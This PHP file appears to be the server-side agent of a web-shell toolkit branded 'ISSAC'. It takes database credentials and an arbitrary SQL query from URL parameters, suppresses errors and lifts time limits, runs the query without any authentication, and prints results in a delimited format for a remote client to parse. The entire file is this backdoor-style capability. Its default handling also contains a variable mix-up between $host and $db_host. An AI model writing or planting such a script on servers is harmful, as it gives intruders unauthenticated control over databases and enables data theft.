<?php
#.o0o.======================[README]======================.o0o.
#Powered by ISSAC
#https://github.com/malbuffer4pt/IssacTools
#Environment : xampp + apache + windows11 + php 8.2.4
#.o0o.======================[README]======================.o0o.

@ini_set('display_errors','0');
@set_time_limit(0);

$db_host = $_GET['host'];
$db_user = $_GET['user'];
$db_pass = $_GET['pass'];
$db      = $_GET['db'];
$sql     = $_GET['sql'];

$host    = isset($host) ? $host : "localhost";
$db_user = isset($db_user) ? $db_user : "root";
$db_pass = isset($db_pass) ? $db_pass : "root";
$db      = isset($db) ? $db : "information_schema";
if (!isset($sql)) {
    die("ERROR://No sql query!");
}

$conn = new mysqli($db_host, $db_user, $db_pass, $db);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 
else {
    echo "conn successful";
}

echo "[MSG]";
try {
    $result       = $conn->query($sql);
    $fields       = mysqli_fetch_fields($result);
    $column_names = array();
    $cells        = array();
    foreach ($fields as $field) {
        $column_names[] = $field->name;
    }
    foreach ($column_names as $col) {
        printf($col."|");
    }
    echo("[COLUMN_SPLIT]");
    while($row = $result->fetch_array()) {
        foreach ($column_names as $col) {
            if ($row[$col] == '' or is_null($row[$col])) {
                printf("NULL|");
            }
            else {
            printf(str_replace('%','%%',$row[$col])."|");
            }
        }
    printf("[ROW_SPLIT]");
    }
} catch (Exception $e) {
    echo "ERROR://".$e;
}
$conn-> close();
?>